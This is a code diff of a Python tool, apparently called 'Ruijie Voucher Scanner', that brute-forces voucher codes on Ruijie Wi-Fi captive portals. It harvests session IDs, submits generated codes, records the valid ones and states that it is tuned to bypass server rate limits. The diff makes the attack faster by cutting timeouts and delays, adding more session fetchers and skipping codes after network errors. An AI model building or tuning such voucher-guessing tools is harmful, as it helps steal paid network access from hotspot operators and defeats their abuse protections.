@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-Ruijie Voucher Scanner v18.5 - SKY BLUE EDITION (ANTI-FREEZE)
-- Auto-Recovery System (Network Drop Protection)
+Ruijie Voucher Scanner v18.6 - SKY BLUE EDITION (AUTO-SKIP)
+- Auto-Skip on Network Drop
 - Dual Code Display
 - Slow & Steady to bypass server rate limits
 """
@@ -35,16 +35,16 @@ from rich.box import HEAVY, ROUNDED, DOUBLE, MINIMAL
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ==========================================
-# ⚙️ TUNING (ANTI-FREEZE)
+# ⚙️ TUNING (AUTO-SKIP)
 # ==========================================
 CONCURRENCY = 2           
-TIMEOUT = 10              # Network drop အတွက် အချိန်ပိုပေးထားတယ်
+TIMEOUT = 5               # ကွန်ရက်နှေးရင် အမြန်ကျော်သွားအောင် အချိန်လျှော့ထားတယ်
 SID_POOL_MAX = 100
-SID_FETCHER_COUNT = 5
+SID_FETCHER_COUNT = 10
 SID_FETCH_SLEEP = 0.5
-DIRECT_TIMEOUT = 10
-WORKER_SID_TIMEOUT = 3.0
-REQUEST_DELAY = 0.5       # ကုဒ်တစ်ခုစစ်ပြီးတိုင်း ခဏနားမယ်
+DIRECT_TIMEOUT = 5
+WORKER_SID_TIMEOUT = 1.0
+REQUEST_DELAY = 0.2       # ကုဒ်တစ်ခုစစ်ပြီးတိုင်း ခဏနားမယ်
 
 console = Console()
 
@@ -147,12 +147,12 @@ def auto_detect_portal():
     session = requests.Session()
     session.headers.update({'User-Agent': 'Mozilla/5.0 (Linux; Android 10)'})
     try:
-        r = session.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=4)
+        r = session.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=3)
         if "ruijienetworks" in r.url: return r.url
     except Exception: pass
     for gw in [get_gateway_ip(), "192.168.110.1", "192.168.0.1"]:
         try:
-            res = session.get(f"http://{gw}", timeout=3, allow_redirects=True)
+            res = session.get(f"http://{gw}", timeout=2, allow_redirects=True)
             if "ruijienetworks" in res.url: return res.url
         except Exception: pass
     return None
@@ -219,7 +219,7 @@ class VoucherScanner:
             Layout(name="hits", ratio=1),
         )
 
-        header_text = Text("☁️ SKY BLUE SCANNER v18.5 - ANTI-FREEZE ☁️", style="bold white on sky_blue1", justify="center")
+        header_text = Text("☁️ SKY BLUE SCANNER v18.6 - AUTO-SKIP ☁️", style="bold white on sky_blue1", justify="center")
         layout["header"].update(Panel(header_text, border_style="sky_blue1", box=ROUNDED))
 
         speed = s['speed']
@@ -285,7 +285,6 @@ class VoucherScanner:
         elif kind == "VALID": self._state['valid'].append((voucher, clock, tl))
         elif kind in ("STA_LIMIT", "EXPIRED"): self._state['dead'].append((voucher, clock, kind))
 
-    # 🛡️ ကွန်ရက်ပြတ်လည်း ဆက်အလုပ်လုပ်မယ့် SID Fetcher
     async def sid_fetcher(self, session):
         while not self._stop:
             try:
@@ -321,13 +320,13 @@ class VoucherScanner:
                                 })
                                 self._state['sid_pool'] = self.sid_pool.qsize()
                 except Exception: 
-                    pass # Error တက်လည်း ဆက်လုပ်မယ်
+                    pass 
 
             except Exception:
                 pass
             await asyncio.sleep(SID_FETCH_SLEEP)
 
-    # 🛡️ ကွန်ရက်ပြတ်လည်း ရပ်မသွားမယ့် Scan Worker
+    # 🛡️ Auto-Skip System (ကွန်ရက်ပြတ်ရင် ကျော်သွားမယ်)
     async def scan_worker(self, session, worker_id):
         while not self._stop:
             try:
@@ -368,7 +367,6 @@ class VoucherScanner:
                 logon = ""
 
                 try:
-                    # Network timeout ကို ကာကွယ်ထားတယ်
                     async with session.post(url, json=payload, headers=headers, proxy=None, ssl=False, timeout=TIMEOUT, allow_redirects=True) as resp:
                         text = await resp.text()
                         
@@ -392,9 +390,9 @@ class VoucherScanner:
                                 tl = parse_remaining_time(result)[0] or ""
 
                 except asyncio.TimeoutError:
-                    status = 'TIMEOUT' # ကွန်ရက်နှေးနေတာ
+                    status = 'TIMEOUT'
                 except aiohttp.ClientError:
-                    status = 'NET_ERROR' # ကွန်ရက်ပြတ်တာ
+                    status = 'NET_ERROR'
                 except Exception:
                     status = 'DEAD_SID'
 
@@ -405,11 +403,12 @@ class VoucherScanner:
                         sid_data['used'] += 1
                         if sid_data['used'] < 10: await self.sid_pool.put(sid_data)
                     elif status in ('TIMEOUT', 'NET_ERROR'):
-                        self._state['status'] = "⚠️ Network unstable, retrying..."
+                        self._state['status'] = "⚠️ Auto-skipping network error..."
                 else:
                     if not self.sid_pool.full(): await self.sid_pool.put(sid_data)
                     self._record_hit(voucher, status, logon, tl)
 
+                # ဒီနေရာမှာ ကုဒ်အသစ်ကို တွန်းထည့်တာနဲ့ အလုပ်ဆက်လုပ်သွားမှာပါ
                 if not self._stop:
                     await self.voucher_queue.put(self.generate_voucher())
 
